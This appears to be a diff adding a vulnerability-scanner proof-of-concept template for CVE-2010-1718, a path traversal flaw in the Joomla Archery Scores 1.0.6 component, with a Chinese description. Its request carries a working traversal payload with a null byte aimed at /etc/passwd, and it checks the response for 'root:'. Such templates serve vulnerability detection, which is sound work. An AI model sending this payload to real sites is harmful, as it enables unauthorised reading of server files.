@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "此漏洞为Joomla!组件Archery Scores 1.0.6中的目录遍历（Path Traversal）安全缺陷。该组件的核心文件archeryscores.php存在验证不足漏洞，攻击者通过向index.php的controller参数传入'..'等目录遍历字符，可绕过安全限制读取或执行系统上的任意文件。此漏洞影响范围内所有使用该组件的网站，攻击者无需身份验证即可远程触发，成功利用可能导致敏感信息泄露、文件上传甚至远程代码执行等严重后果，具有较高的安全风险。"
+id = "POC-AVE-2010-0064"
+name = "Joomla! Component Archery Scores 1.0.6 路径遍历漏洞 PoC"
+severity = "medium"
+tags = ["ave-2010-0064"]
+vuln_id = [
+    "CVE-2010-1718",
+    "AVE-2010-0064",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "option=com_archeryscores&controller=../../../../../../../../../etc/passwd%00"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
